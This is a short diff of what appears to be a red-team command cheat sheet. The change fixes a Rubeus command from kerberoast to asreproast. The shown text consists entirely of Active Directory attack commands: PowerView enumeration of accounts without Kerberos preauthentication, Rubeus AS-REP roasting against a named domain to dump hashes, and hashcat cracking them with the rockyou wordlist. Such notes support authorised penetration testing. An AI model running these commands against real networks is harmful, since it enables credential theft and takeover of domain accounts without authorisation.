@@ -9,7 +9,7 @@ hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMe
 ### ASREPRoasting
 ```
 powershell Get-DomainUser -PreauthNotRequired -Properties SamAccountName
-execute-assembly C:\Users\Public\Rubeus.exe  kerberoast format:hashcat /outfile:hashes.asreproast
+execute-assembly C:\Users\Public\Rubeus.exe asreproast format:hashcat /outfile:hashes.asreproast
 execute-assembly C:\Users\Public\Rubeus.exe asreproast /domain:dev.insomnia.co.mm
 hashcat64.exe -a 0 -m 18200 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable
 ```
